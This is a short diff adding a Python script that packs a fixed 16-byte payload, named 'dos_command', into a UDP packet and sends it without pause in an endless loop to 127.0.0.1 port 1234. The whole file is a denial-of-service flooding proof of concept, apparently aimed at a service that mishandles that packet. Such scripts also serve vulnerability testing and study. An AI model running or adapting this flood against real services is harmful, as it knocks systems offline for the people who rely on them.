@@ -1,0 +1,8 @@
+import socket
+import time
+dos_command = [0x18 ,0xB3 ,0xC0 ,0x00 ,0x00 ,0x95 ,0x43 ,0x03 ,0x01 ,0x00 ,0x00 ,0x00 ,0x30 ,0x2E ,0x32 ,0x31]
+byte_message = bytes(dos_command)
+opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+while True:
+    opened_socket.sendto(byte_message, ("127.0.0.1", 1234))
